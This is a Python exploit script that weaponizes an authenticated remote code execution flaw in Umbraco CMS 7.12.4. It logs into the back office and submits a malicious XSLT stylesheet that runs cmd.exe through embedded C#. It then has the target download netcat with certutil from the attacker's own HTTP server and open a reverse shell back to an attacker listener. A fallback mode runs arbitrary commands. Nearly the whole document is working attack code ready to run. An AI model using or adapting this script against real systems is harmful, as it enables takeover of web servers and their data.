#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################
# ▄• ▄▌• ▌ ▄ ·. ▄▄▄▄· ▄▄▄   ▄▄▄·  ▄▄·                                                                          #
# █▪██▌·██ ▐███▪▐█ ▀█▪▀▄ █·▐█ ▀█ ▐█ ▌▪▪                                                                        #
# █▌▐█▌▐█ ▌▐▌▐█·▐█▀▀█▄▐▀▀▄ ▄█▀▀█ ██ ▄▄ ▄█▀▄                                                                    #
# ▐█▄█▌██ ██▌▐█▌██▄▪▐█▐█•█▌▐█ ▪▐▌▐███▌▐█▌.▐▌                                                                   #
#  ▀▀▀ ▀▀  █▪▀▀▀·▀▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀  ▀█▄▀▪                                                                   #
# DATE                                                                                                         #
# 07/04/2020                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
#                                                                                                              #
# Authenticated by remote code execution in Umbraco CMS 7.12.4 by deserialize                                  #
# VIEWSTATE. This version is just weaponizes EDB-ID: 46153                                                     #
#                                                                                                              #
# nighter - http://nighter.se/                                                                                 #
#                                                                                                              #
################################################################################################################

import SimpleHTTPServer
import SocketServer
import requests
import signal
import time
import os
import sys
import re

from bs4 import BeautifulSoup
from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def prepare_payload():

    if os.path.isfile('./.nc.exe') is False:
        print("[-] netcat payload not found.")
        sys.exit(0)

    os.system('cp ./.nc.exe /tmp/nc.exe 2>/dev/null')
    if os.path.isfile('/tmp/nc.exe') is False:
        print("[-] prepare netcat payload failed.")
        sys.exit(0)

def HttpListener():

    os.chdir('/tmp')
    HTTP_PORT = 8000
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", HTTP_PORT), Handler)
    print("[+] HTTP Listen = %s" % HTTP_PORT)
    httpd.serve_forever()


def rce(command, stdout=False):

    payload = """<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "/c %s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>""" % command

    # Process Login
    url_login = "%s/umbraco/backoffice/UmbracoApi/Authentication/PostLogin" % URL
    loginfo = {"username": USERNAME, "password": PASSWORD}
    s = requests.session()
    r2 = s.post(url_login, json=loginfo)

    # Go to vulnerable web page
    url_xslt = "%s/umbraco/developer/Xslt/xsltVisualize.aspx" % URL
    r3 = s.get(url_xslt)

    soup = BeautifulSoup(r3.text, 'html.parser')

    VIEWSTATE = soup.find(id="__VIEWSTATE")['value']
    VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']
    UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
    headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}
    data = {"__EVENTTARGET": "", "__EVENTARGUMENT": "", "__VIEWSTATE": VIEWSTATE,
            "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
            "ctl00$body$xsltSelection": payload,
            "ctl00$body$contentPicker$ContentIdValue": "",
            "ctl00$body$visualizeDo": "Visualize+XSLT"}

    # Launch the attack
    r4 = s.post(url_xslt, data=data, headers=headers)
    # Filter output
    soup = BeautifulSoup(r4.text, 'html.parser')
    CMDOUTPUT = soup.find(id="result").getText()
    if stdout is True:
        print(CMDOUTPUT)


def exploit():

    time.sleep(5)

    print("[+] Exploit")

    command = '''certutil.exe -urlcache -split -f http://%s:8000/nc.exe c:\\\\Windows\\\\temp\\\\nc.exe''' % LHOST
    rce(command, stdout=True)

    time.sleep(2)

    command = '''c:\\\\Windows\\\\temp\\\\nc.exe %s %s -e cmd.exe''' % (LHOST, LPORT)
    rce(command, stdout=True)


if __name__ == '__main__':

    if len(sys.argv) < 5:
        print ("""
▄• ▄▌• ▌ ▄ ·. ▄▄▄▄· ▄▄▄   ▄▄▄·  ▄▄·       
█▪██▌·██ ▐███▪▐█ ▀█▪▀▄ █·▐█ ▀█ ▐█ ▌▪▪     
█▌▐█▌▐█ ▌▐▌▐█·▐█▀▀█▄▐▀▀▄ ▄█▀▀█ ██ ▄▄ ▄█▀▄ 
▐█▄█▌██ ██▌▐█▌██▄▪▐█▐█•█▌▐█ ▪▐▌▐███▌▐█▌.▐▌
 ▀▀▀ ▀▀  █▪▀▀▀·▀▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀  ▀█▄▀▪
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
        print("EXAMPLE: ./umbraco_cms_rce.py 'http://127.0.0.1' 10.10.14.24 1337 <USERNAME> <PASSWORD>\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USERNAME = sys.argv[4]

    try:
        PASSWORD = sys.argv[5]
    except:
        # Ugly remap for command execution only
        USERNAME = LHOST
        PASSWORD = LPORT
        COMMAND = USERNAME
        rce(COMMAND, stdout=True)
        sys.exit(0)

    prepare_payload()

    # Serve payload
    p = Process(target=HttpListener)
    p.start()

    # Serve payload
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)